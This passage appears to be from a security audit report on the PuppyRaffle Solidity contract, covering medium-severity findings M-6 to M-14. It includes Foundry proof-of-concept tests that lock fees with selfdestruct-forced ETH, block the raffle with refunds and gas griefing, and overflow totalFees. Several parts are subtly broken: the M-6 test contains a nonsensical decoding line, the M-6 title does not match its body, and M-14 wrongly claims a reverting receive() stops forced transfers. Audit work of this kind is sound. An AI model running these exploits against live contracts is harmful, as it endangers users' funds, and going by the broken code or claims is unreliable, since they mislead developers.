3. From now on:
   • `enterRaffle` reverts (duplicate 0-address).
   • After `raffleDuration` elapses, any call to `selectWinner` reverts with "PuppyRaffle: Failed to send prize pool to winner" because `prizePool = players.length * entranceFee` is larger than the real balance.
4. Raffle is permanently stuck; neither new players nor owner operations (`withdrawFees`) can succeed until the contract is upgraded or self-destructed.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract RefundDiscrepancyTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE, address(this), 1 days);
    }

    function test_refundCausesSelectWinnerRevert() public {
        address[] memory acc = new address[](10);
        for (uint256 i; i < 10; i++) {
            acc[i] = address(uint160(i + 1));
            vm.deal(acc[i], ENTRANCE);
            vm.prank(acc[i]);
            address[] memory single = new address[](1);
            single[0] = acc[i];
            raffle.enterRaffle{value: ENTRANCE}(single);
        }

        // First five players refund – duplicates of address(0) are now present
        for (uint256 i; i < 5; i++) {
            vm.prank(acc[i]);
            raffle.refund(i);
        }

        // Fast-forward to raffle end
        vm.warp(block.timestamp + 1 days);

        vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Keep an "active players" array without gaps. When a player refunds, swap-and-pop their slot (or maintain a mapping(address => bool) for membership) so there are never duplicate zero addresses. Compute `prizePool` from `address(this).balance` (or `activePlayers.length * entranceFee`) instead of `players.length`. Example refund:

```
function refund(uint256 index) external {
    require(players[index] == msg.sender, "not player");

    // swap & pop
    uint256 last = players.length - 1;
    if (index != last) {
        players[index] = players[last];
    }
    players.pop();

    Address.sendValue(payable(msg.sender), entranceFee);
    emit RaffleRefunded(msg.sender);
}
```

With no duplicates, `enterRaffle`'s duplicate check passes, and `selectWinner` should use `uint256 prizePool = address(this).balance * 80 / 100;` so it can never exceed the actual balance.

## [M-6]. Event Consistency issue in PuppyRaffle::tokenURI

## Description
The contract's `tokenURI` function dynamically builds an NFT's metadata JSON but doesn't properly escape string values, potentially causing malformed JSON if the contract name contains special characters.

## Impact
Every NFT minted by the contract carries a malformed metadata URI because the `rarity` value is inserted without surrounding quotation marks. Marketplaces and wallets that expect valid JSON will reject or ignore these tokens, severely degrading their usability and secondary-market value. No funds are stolen, but the core utility of the raffle (delivering a tradeable NFT) is broken for every user.

## Proof of Concept
1. Deploy PuppyRaffle with any constructor parameters (name defaults to 'Puppy Raffle').
2. Enter the raffle with at least four players and call `selectWinner` so that a token (id 0) is minted.
3. Call `tokenURI(0)`.
4. Decode the Base64 payload – it contains …
   {
     "name":"Puppy Raffle", "description":"An adorable puppy!", 
     "attributes": [{"trait_type": "rarity", "value": common}],
     "image":"ipfs://…"
   }
   Note that the value `common` is **not** quoted, making the JSON invalid. The same happens for `rare` and `legendary`.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract TokenURIMalformedTest is Test {
    PuppyRaffle raffle;
    address feeReceiver = address(0xCAFE);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, feeReceiver, 1); // fee 1 ETH, duration 1s
    }

    function test_tokenURI_isMalformed() public {
        // prepare 4 players so selectWinner can be called
        address[4] memory players = [address(1), address(2), address(3), address(4)];
        for (uint256 i; i < players.length; i++) {
            vm.deal(players[i], 1 ether);
            vm.prank(players[i]);
            address[] memory single = new address[](1);
            single[0] = players[i];
            raffle.enterRaffle{value: 1 ether}(single);
        }

        // fast-forward so raffle is finished and pick a winner
        vm.warp(block.timestamp + 2);
        raffle.selectWinner();

        // read tokenURI for token 0
        string memory uri = raffle.tokenURI(0);
        bytes memory raw = vm.parseBytes(vm.decode(string(abi.encodePacked("bytes ", uri))[0:0])); // just convert to bytes

        // look for the exact fragment without quotes
        bytes memory needle = bytes("\"value\": common");
        bool found = _contains(raw, needle);
        assertTrue(found, "rarity value is still unquoted – JSON malformed");
    }

    function _contains(bytes memory hay, bytes memory needle) internal pure returns (bool) {
        if (needle.length > hay.length) return false;
        for (uint256 i; i <= hay.length - needle.length; i++) {
            bool match_ = true;
            for (uint256 j; j < needle.length; j++) {
                if (hay[i + j] != needle[j]) { match_ = false; break; }
            }
            if (match_) return true;
        }
        return false;
    }
}

## Suggested Mitigation
Wrap the rarity string in quotes and (optionally) escape user-controlled fields:

``solidity
string memory json = Base64.encode(
    bytes(
        abi.encodePacked(
            '{"name":"', name(), '", ',
            '"description":"An adorable puppy!", ',
            '"attributes": [{"trait_type": "rarity", "value": "', rareName, '"}], ',
            '"image":"', imageURI, '"}'
        )
    )
);
return string(abi.encodePacked(_baseURI(), json));
```

## [M-7]. Unexpected Eth issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function in PuppyRaffle does not properly validate if the contract has sufficient balance to send the prize to the winner. It assumes the contract's balance is at least equal to the calculated prize pool, but this might not be true if someone used `selfdestruct` to forcibly send ETH to the contract or if there was an ETH airdrop.

```solidity
function selectWinner() external {
    // ...
    uint256 totalAmountCollected = players.length * entranceFee;
    uint256 prizePool = (totalAmountCollected * 80) / 100;
    // ...
    (bool success, ) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    // ...
}
```

## Impact
If the contract receives unexpected ETH (through `selfdestruct` or ETH airdrops), the contract's balance won't match the expected prize pool. This discrepancy won't directly cause a problem in `selectWinner`, but it will make the check in `withdrawFees` fail, preventing the owner from withdrawing fees, effectively locking them forever.

## Proof of Concept
1. Contract runs normally with players entering the raffle
2. An attacker sends 1 wei using `selfdestruct` to the contract address
3. The raffle completes, and a winner is selected without issue
4. When the owner tries to call `withdrawFees`, the function reverts because the contract balance (contract balance + 1 wei) is not equal to the `totalFees`
5. As a result, fees are permanently locked in the contract

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract SelfDestructAttacker {
    function attack(address payable target) public payable {
        selfdestruct(target);
    }
}

contract UnexpectedEthTest is Test {
    PuppyRaffle puppyRaffle;
    SelfDestructAttacker attacker;
    uint256 entranceFee = 1e18;
    address feeAddress = address(1);
    uint256 duration = 1 days;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
        attacker = new SelfDestructAttacker();
    }
    
    function testUnexpectedEthLocksFees() public {
        // Add players to the raffle
        address[] memory players = new address[](4);
        players[0] = address(10);
        players[1] = address(11);
        players[2] = address(12);
        players[3] = address(13);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        
        // Send unexpected ETH to the contract using selfdestruct
        attacker.attack{value: 1 wei}(payable(address(puppyRaffle)));
        
        // Advance time and select winner
        vm.warp(block.timestamp + duration + 1);
        puppyRaffle.selectWinner();
        
        // Check contract balance and total fees
        uint256 contractBalance = address(puppyRaffle).balance;
        uint256 totalFees = puppyRaffle.totalFees();
        
        console.log("Contract balance: %s", contractBalance);
        console.log("Total fees: %s", totalFees);
        console.log("Unexpected ETH: %s", contractBalance - totalFees);
        
        // Try to withdraw fees - this should fail
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
        
        // Verify fees are locked
        assertEq(address(puppyRaffle).balance, contractBalance, "Contract balance should not change");
    }
}

## Suggested Mitigation
function withdrawFees() external {
    // 1. Make sure the raffle is idle (no active, non-refunded players)
    for (uint256 i; i < players.length; ++i) {
        require(players[i] == address(0), "PuppyRaffle: players still active");
    }

    uint256 feesToWithdraw = totalFees;
    require(feesToWithdraw > 0, "PuppyRaffle: nothing to withdraw");
    require(address(this).balance >= feesToWithdraw, "PuppyRaffle: insufficient balance");

    totalFees = 0;
    (bool ok, ) = feeAddress.call{value: feesToWithdraw}("");
    require(ok, "PuppyRaffle: fee transfer failed");
}

// OPTIONAL: allow the owner to sweep any dust that is *not* part of totalFees
function rescueDust(address payable to) external onlyOwner {
    uint256 dust = address(this).balance - uint256(totalFees);
    require(dust > 0, "PuppyRaffle: no dust");
    (bool ok, ) = to.call{value: dust}("");
    require(ok, "PuppyRaffle: dust transfer failed");
}

## [M-8]. Array Limits issue in PuppyRaffle::refund

## Description
The `refund` function replaces the refunded player's address with `address(0)` but doesn't reduce the length of the `players` array. This means that the array size continues to grow even as players are refunded, which affects gas costs for future operations that iterate through the array.

```solidity
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    
    payable(msg.sender).sendValue(entranceFee);
    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

## Impact
Because refunded players are kept as address(0), players.length is larger than the number of funded tickets. selectWinner() uses players.length to calculate prizePool and fee. After several refunds, prizePool can exceed the contract balance, causing the ETH transfer to the winner to fail and selectWinner() to revert. Anybody can repeatedly trigger the revert, permanently blocking the raffle from finishing (denial-of-service) and trapping all ETH inside the contract.

## Proof of Concept
1. Four addresses enter the raffle paying the entranceFee.
2. Three of them call refund(). The contract balance now equals 1 × entranceFee but players.length is still 4.
3. Wait until raffleDuration has elapsed.
4. Call selectWinner().
   • totalAmountCollected = 4 × entranceFee
   • prizePool        = 80% of that amount ( > contract balance )
   • winner.call{value: prizePool} fails → success == false → require reverts.
5. Anyone can repeat step 4; the raffle can never finish until a new player tops up the missing ETH, effectively DoSing the protocol.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RefundArrayIssueTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant DURATION     = 1 days;

    address feeAddress = makeAddr("fee");
    address p1 = makeAddr("p1");
    address p2 = makeAddr("p2");
    address p3 = makeAddr("p3");
    address p4 = makeAddr("p4");

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, DURATION);
        vm.deal(p1, 10 ether);
        vm.deal(p2, 10 ether);
        vm.deal(p3, 10 ether);
        vm.deal(p4, 10 ether);

        address[] memory players = new address[](4);
        players[0] = p1;
        players[1] = p2;
        players[2] = p3;
        players[3] = p4;
        vm.prank(p1);
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);

        // Three players refund
        vm.prank(p2); raffle.refund(1);
        vm.prank(p3); raffle.refund(2);
        vm.prank(p4); raffle.refund(3);
    }

    function test_SelectWinnerRevertsWhenArrayInflated() public {
        vm.warp(block.timestamp + DURATION + 1);
        vm.expectRevert(bytes("PuppyRaffle: Failed to send prize pool to winner"));
        raffle.selectWinner();
    }
}

## Suggested Mitigation
In refund(), delete the element in O(1) by swapping with the last element and popping the array: `players[playerIndex] = players[players.length - 1]; players.pop();`. This keeps players.length equal to the number of paid tickets and prevents the prizePool mis-calculation. Alternatively, replace the dynamic array with a mapping(address => bool) and a separate counter.

## [M-9]. Integer Overflow/Math issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function has an integer type conversion vulnerability. The `totalFees` variable is stored as a `uint64`, but when checking the contract balance, it's compared with a `uint256` value. This can lead to overflow issues when the total fees exceed the maximum value of a `uint64` (2^64 - 1).

```solidity
function withdrawFees() external {
    require(
        address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!"
    );
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## Impact
Once totalFees wraps to a smaller value, address(this).balance will permanently be greater than totalFees. Any call to withdrawFees() will revert because of the balance-to-totalFees equality check, making the whole fee pot unclaimable forever. The protocol revenue is therefore locked and the owner can never withdraw it. No user funds are at risk, but a permanent denial of revenue for the fee recipient occurs.

## Proof of Concept
1. Accumulate or directly set `totalFees` so it is close to 2^64-1.
2. Trigger another raffle round; `selectWinner()` adds the next fee and stores it back as `uint64`, wrapping the value.
3. `totalFees` now contains a much smaller number (wrap-around) while the ETH is still held by the contract.
4. `withdrawFees()` compares `address(this).balance` (still the large, correct value) with the wrapped `totalFees` and reverts, permanently locking the funds.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "forge-std/StdStorage.sol";
import "../src/PuppyRaffle.sol";

contract TotalFeesOverflow is Test {
    using stdStorage for StdStorage;

    PuppyRaffle raffle;
    StdStorage store;

    address feeCollector = makeAddr("feeCollector");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address carol = makeAddr("carol");
    address dave = makeAddr("dave");

    uint256 constant FEE = 1 ether;

    function setUp() public {
        // raffleDuration = 0 so we can finish the round immediately
        raffle = new PuppyRaffle(FEE, feeCollector, 0);
        vm.deal(alice, 10 ether);
        vm.deal(bob,   10 ether);
        vm.deal(carol, 10 ether);
        vm.deal(dave,  10 ether);
    }

    function test_overflowLocksFees() public {
        // 1) start a valid raffle round with 4 players
        address[] memory players = new address[](4);
        players[0] = alice;
        players[1] = bob;
        players[2] = carol;
        players[3] = dave;

        vm.prank(alice);
        raffle.enterRaffle{value: 4 * FEE}(players);

        // 2) Force totalFees near 2^64-1 using stdstore cheat-code
        uint64 nearMax = type(uint64).max - 1 ether; // leave space for the next fee
        store.target(address(raffle)).sig("totalFees()").write(nearMax);

        // 3) Finish the round; this adds another fee and overflows
        raffle.selectWinner();

        uint256 wrappedFees = raffle.totalFees();
        assertLt(wrappedFees, 1 ether);             // wrapped down
        assertGt(address(raffle).balance, wrappedFees); // real ETH still in contract

        // 4) Any attempt to withdraw now reverts
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Use `uint256` instead of `uint64` for the `totalFees` variable to prevent overflow issues. This ensures the fees can grow to any reasonable value without risk of overflow.

```solidity
// Change this line in state variables
uint256 public totalFees;

// In selectWinner(), remove the uint64 cast
totalFees = totalFees + fee;

// withdrawFees() remains the same
function withdrawFees() external {
    require(
        address(this).balance == totalFees,
        "PuppyRaffle: There are currently players active!"
    );
    uint256 feesToWithdraw = totalFees;
    totalFees = 0;
    (bool success, ) = feeAddress.call{value: feesToWithdraw}("");
    require(success, "PuppyRaffle: Failed to withdraw fees");
}
```

## [M-10]. Array Limits issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function chooses the winner using a random index but doesn't account for the possibility that some players have been refunded (their addresses set to address(0)). This means a non-existent player (address(0)) could be selected as the winner.

```solidity
function selectWinner() external {
    // ...
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    // No check if winner is address(0)
    // ...
    previousWinner = winner;
    (bool success, ) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    _safeMint(winner, tokenId);
}
```

## Impact
If every refunded slot becomes address(0) the raffle can enter a denial-of-service state: `selectWinner()` will always revert when the zero address is drawn because `_safeMint()` refuses to mint to `address(0)`. No ETH is lost (the whole call, including the `call{value: prizePool}` transfer, is reverted), but the raffle round – and therefore all funds held in the contract – remain locked until a code-change (impossible) or a valid winner can be drawn, which may be impossible when all entries are zero.

## Proof of Concept
1. Four players join the raffle (minimum required).
2. All four call `refund()`; `players` length is still 4 but every slot is now `address(0)`.
3. Fast-forward past `raffleDuration` and call `selectWinner()`.
4. `winner = address(0)`, the ETH transfer succeeds, but `_safeMint(address(0), …)` reverts, reverting the entire transaction.
5. Every subsequent call to `selectWinner()` deterministically selects `address(0)`, so the raffle is permanently stuck.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;
import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ZeroWinnerTest is Test {
    PuppyRaffle raffle;
    address alice = address(0xA1);
    address bob   = address(0xB0);
    address carol = address(0xC0);
    address dave  = address(0xD0);

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, address(this), 1 days);
        deal(alice, 10 ether);
        deal(bob,   10 ether);
        deal(carol, 10 ether);
        deal(dave,  10 ether);

        address[] memory p = new address[](4);
        p[0] = alice; p[1] = bob; p[2] = carol; p[3] = dave;
        vm.prank(alice);
        raffle.enterRaffle{value: 4 ether}(p);

        vm.prank(alice); raffle.refund(0);
        vm.prank(bob);   raffle.refund(1);
        vm.prank(carol); raffle.refund(2);
        vm.prank(dave);  raffle.refund(3);

        vm.warp(block.timestamp + 2 days);
    }

    function test_selectWinnerRevertsWithZeroAddress() public {
        vm.expectRevert();
        raffle.selectWinner();
    }
}

## Suggested Mitigation
Skip empty slots when choosing a winner, e.g.:

    function _drawWinner() internal view returns (address) {
        uint256 len = players.length;
        require(len >= 4, "Need ≥ 4 players");
        uint256 idx;
        address candidate;
        uint256 counter = 0; // guarantees termination
        do {
            idx = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty, counter))) % len;
            candidate = players[idx];
            counter++;
        } while (candidate == address(0));
        return candidate;
    }

Alternatively keep a separate `activePlayers` array or compact the array on each `refund()` so it contains only valid addresses.

## [M-11]. Array Limits issue in PuppyRaffle::enterRaffle

## Description
The contract doesn't verify if `address(0)` is among the addresses passed to `enterRaffle`. This could lead to funds being sent to the zero address, effectively burning them.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        // No check if newPlayers[i] is address(0)
        players.push(newPlayers[i]);
    }
    
    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    emit RaffleEnter(newPlayers);
}
```

## Impact
If a user accidentally includes the zero address in their entry list, they will pay for that entry but the associated ETH will be effectively burned as it cannot be refunded. Additionally, if the zero address is selected as the winner, the prize pool might be sent to the zero address (lost forever) and the NFT might be minted to the zero address (also lost). While the contract does attempt to prevent the zero address from winning by checking for refunded players, it doesn't prevent the zero address from being registered initially.

## Proof of Concept
1. A user calls enterRaffle with an array containing address(0)
2. The contract accepts the entry and the user pays the entrance fee for this invalid address
3. The zero address cannot refund its entry (as it cannot sign transactions)
4. If the zero address is selected as winner, the prize money is sent to address(0) and lost forever
5. An NFT would also be minted to address(0), rendering it inaccessible

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ZeroAddressEntryTest is Test {
    PuppyRaffle puppyRaffle;
    address public user1 = makeAddr("user1");
    uint256 entranceFee = 1e18;
    
    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            address(this),
            1 weeks
        );
        
        vm.deal(user1, 100 ether);
    }
    
    function testZeroAddressEntry() public {
        // Create an array with address(0)
        address[] memory players = new address[](2);
        players[0] = user1;
        players[1] = address(0);
        
        // Enter the raffle with address(0)
        vm.prank(user1);
        puppyRaffle.enterRaffle{value: entranceFee * 2}(players);
        
        // Verify address(0) is in the players array
        bool foundZeroAddress = false;
        for (uint256 i = 0; i < 2; i++) {
            address playerAddress = puppyRaffle.players(i);
            if (playerAddress == address(0)) {
                foundZeroAddress = true;
                break;
            }
        }
        
        assertTrue(foundZeroAddress, "address(0) should be accepted as a player");
        
        // Try to refund the zero address entry (should fail as msg.sender needs to be address(0))
        vm.expectRevert("PuppyRaffle: Only the player can refund");
        puppyRaffle.refund(1); // Index 1 is address(0)
        
        // This means the entrance fee for address(0) is locked in the contract
        // If address(0) wins, the prize would be sent to it and lost forever
    }
}

## Suggested Mitigation
Add validation to reject address(0) entries in the enterRaffle function:

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    
    // Validate addresses before adding them
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address playerAddress = newPlayers[i];
        require(playerAddress != address(0), "PuppyRaffle: Zero address cannot enter raffle");
        players.push(playerAddress);
    }
    
    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    
    emit RaffleEnter(newPlayers);
}
```

Also add a check in the selectWinner function to ensure the winner is not address(0):

```solidity
function selectWinner() external {
    // ...
    uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    
    // Add this check
    require(winner != address(0), "PuppyRaffle: Winner cannot be zero address");
    // ...
}
```

## [M-12]. Array Limits issue in PuppyRaffle::enterRaffle

## Description
The contract includes a nested loop in the `enterRaffle` function to check for duplicate players, which can lead to out-of-gas errors as the number of players increases. Additionally, the function does not limit the number of players that can be entered at once, allowing potential attackers to submit extremely large arrays that could exceed block gas limits.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    // ... 
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
    }
    
    // Check for duplicates
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    // ...
}
```

## Impact
Because the duplicate-check inside enterRaffle is O(n²) on the entire players array, gas grows quadratically with each raffle round. An attacker that submits hundreds of paid, unique addresses in a single call can raise the per-call gas cost for later users above the 30 M block gas limit, permanently blocking new entries until the current raffle ends or the owner cancels the round. Although the attacker must deposit the entrance fees, the funds can later be recovered through refund(), so the griefing cost is limited to gas, making a denial-of-service economically feasible.

## Proof of Concept
1. Assume entranceFee = 1 wei for easier testing.
2. Attacker builds an address[] list with 550 unique addresses (≈ 150 K pairwise comparisons).
3. Attacker calls enterRaffle{value:550}(bigArray) ‑- succeeds.
4. A honest user now tries to buy one ticket:
   enterRaffle{value:1}([victimAddress])
   Gas needed > 30 M, therefore tx cannot fit into a block and will be rejected, effectively freezing further participation until the round resets.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import "forge-std/Test.sol";
import {PuppyRaffle} from "src/PuppyRaffle.sol";

contract RaffleGasDoSTest is Test {
    PuppyRaffle raffle;
    uint256 public constant FEE = 1; // 1 wei keeps test cheap
    address owner = address(0xABCD);
    address feeAddress = address(0xBEEF);

    function setUp() public {
        vm.prank(owner);
        raffle = new PuppyRaffle(FEE, feeAddress, 1 days);
        vm.deal(address(this), type(uint256).max); // unlimited ether for test
    }

    function testDenialOfService() public {
        uint256 big = 550; // enough to exceed 30M gas later
        address[] memory bigArray = new address[](big);
        for (uint256 i; i < big; ++i) bigArray[i] = address(uint160(i + 1));

        // attacker adds 550 players (fits inside Foundry gas limit)
        raffle.enterRaffle{value: FEE * big}(bigArray);

        // victim tries to add one more player inside a realistic block gas limit
        vm.txGasLimit(30_000_000); // current mainnet block limit
        address[] memory one = new address[](1);
        one[0] = address(0xDEAD);

        // Expect the call to revert because it cannot fit into the block
        vm.expectRevert();
        raffle.enterRaffle{value: FEE}(one);
    }
}

## Suggested Mitigation
Replace the quadratic duplicate scan with a mapping(address => bool) seen; check and insert in O(1). Additionally bound the newPlayers array size (e.g. <= 100) to protect against a single-transaction gas spike.

## [M-13]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function contains a nested loop that checks for duplicate players by comparing each new player against all existing players. As the `players` array grows, the gas cost of this operation increases quadratically (O(n²)), which can lead to block gas limit issues and denial of service when the raffle has many participants.

```solidity
function enterRaffle(address[] memory newPlayers) public payable {
    // ...
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
    // ...
}
```

## Impact
Because the duplicate-check is O(n²), gas grows super-linearly with the number of entrants. Once a few-hundred addresses have joined, calling enterRaffle will run out of gas and revert, effectively preventing any more tickets from being sold for the current round. Existing participants can still call selectWinner and withdraw prizes, so funds are never trapped, but usability and revenue are hurt.

## Proof of Concept
1. First batch of players enter the raffle (e.g., 100 participants)
2. The duplicate check loop runs 4,950 comparisons (n*(n-1)/2)
3. As more players join, gas costs increase quadratically
4. When the raffle reaches several hundred participants, new entries will fail due to exceeding the block gas limit
5. If the raffle cannot reach the required 4 players, funds are locked until enough players can be added

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract GasLimitTest is Test {
    PuppyRaffle puppyRaffle;
    address public user1 = makeAddr("user1");
    address public user2 = makeAddr("user2");

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            1 ether,
            address(this),
            1 days
        );
        vm.deal(user1, 100 ether);
    }

    function testGasLimitDOS() public {
        // Measure gas for 10 players
        address[] memory players10 = new address[](10);
        for (uint256 i = 0; i < 10; i++) {
            players10[i] = address(uint160(i + 1));
        }
        uint256 gas10 = gasleft();
        vm.prank(user1);
        puppyRaffle.enterRaffle{value: 10 ether}(players10);
        gas10 = gas10 - gasleft();
        
        // Measure gas for 20 players
        address[] memory players20 = new address[](20);
        for (uint256 i = 0; i < 20; i++) {
            players20[i] = address(uint160(i + 21));
        }
        uint256 gas20 = gasleft();
        vm.prank(user1);
        puppyRaffle.enterRaffle{value: 20 ether}(players20);
        gas20 = gas20 - gasleft();
        
        // Gas increase should be more than linear
        assertTrue(gas20 > gas10 * 2, "Gas increase should be more than linear");
        
        // Estimate for 100 players would exceed block gas limit
        // (current limit ~30M, typical safe max ~15M)
        uint256 estimatedGas100 = gas10 * 10 * 10; // Quadratic increase
        assertTrue(estimatedGas100 > 15_000_000, "100 players would exceed practical gas limits");
    }
}

## Suggested Mitigation
Introduce a mapping(address=>bool) isParticipant to do constant-time duplicate checks:

function enterRaffle(address[] calldata _players) external payable {
    require(msg.value == entranceFee * _players.length, "bad fee");
    for (uint256 i; i < _players.length; ++i) {
        address p = _players[i];
        require(!isParticipant[p], "duplicate");
        isParticipant[p] = true;
        players.push(p);
    }
    emit RaffleEnter(_players);
}

When a ticket is refunded or when selectWinner() resets the raffle, set isParticipant[addr] = false for the affected addresses (iterate only over players in memory once per round). This keeps gas usage linear and removes the DoS vector.

## [M-14]. Unexpected Eth issue in PuppyRaffle::NA

## Description
The contract relies on a check that assumes the contract balance equals accumulated fees when no players are active. However, this check can be bypassed by sending ETH directly to the contract address, as the contract has no mechanism to handle or reject direct ETH transfers (no `receive()` or `fallback()` function). This can artificially inflate the contract balance and potentially break the balance check logic.

```solidity
function withdrawFees() external {
    require(
        address(this).balance == uint256(totalFees),
        "PuppyRaffle: There are currently players active!"
    );
    // ...
}
```

Without proper protection, anyone can send ETH directly to the contract, which will affect the balance checks.

## Impact
Direct ETH transfers to the contract address can disrupt the fee withdrawal logic, preventing legitimate fee withdrawals. An attacker could intentionally send small amounts of ETH to permanently lock fees in the contract. This would create a denial of service for the fee withdrawal mechanism, preventing the protocol owner from accessing accumulated fees, and potentially leading to financial loss for the protocol.

## Proof of Concept
1. Complete a raffle so `totalFees > 0` and `players` is reset to empty.
2. Deploy a helper contract `ForceSend` with some ETH:
   ```solidity
   contract ForceSend { constructor() payable {} function force(address payable to) external { selfdestruct(to); } }
   ```
3. Call `force(address(puppyRaffle))` – the self-destruct pushes ETH to `PuppyRaffle` without calling any function.
4. Now `address(puppyRaffle).balance > totalFees` even though there are no active players.
5. Owner calls `withdrawFees()` → reverts with `"PuppyRaffle: There are currently players active!"`, permanently locking protocol fees unless somebody can perfectly rebalance the amount.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/PuppyRaffle.sol";

contract ForceSend { // helper to push ETH without calling receive()
    constructor() payable {}
    function force(address payable target) external {
        selfdestruct(target);
    }
}

contract UnexpectedEthTest is Test {
    PuppyRaffle raffle;
    address feeAddress = makeAddr("fee");

    function setUp() public {
        raffle = new PuppyRaffle(1 ether, feeAddress, 1 days);
        // prepare 4 players and finish one raffle to accrue fees
        address[] memory p = new address[](4);
        for (uint i; i < 4; ++i) {
            p[i] = makeAddr(vm.toString(i));
            vm.deal(p[i], 2 ether);
        }
        vm.prank(p[0]);
        raffle.enterRaffle{value: 4 ether}(p);
        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner(); // fees stored, players cleared
    }

    function testForcedEthLocksWithdraw() public {
        uint256 fees = raffle.totalFees();
        assertGt(fees, 0);

        // push unexpected ETH through self-destruct
        ForceSend fs = new ForceSend{value: 0.1 ether}();
        fs.force(payable(address(raffle)));
        assertGt(address(raffle).balance, fees, "balance should now exceed recorded fees");

        // owner tries to withdraw
        vm.prank(raffle.owner());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Either (A) add a `receive()`/`fallback()` function that immediately reverts to block *all* direct and forced ETH transfers, *or* (B) remove the fragile balance equality check and instead assert `players.length == 0` before withdrawing. Option B should also ensure `totalFees` is not zero and that `address(this).balance >= totalFees`.



# Low Risk Findings

## [L-1]. Event Consistency issue in PuppyRaffle::selectWinner

## Description
The selectWinner function emits no event when a winner is selected and prizes are distributed. This is a critical state change that should be logged for transparency and off-chain monitoring.

Vulnerable code:
```solidity
function selectWinner() external {
    // ... winner selection logic ...
    // Missing: emit WinnerSelected(winner, prizePool, tokenId);
}
```

## Impact
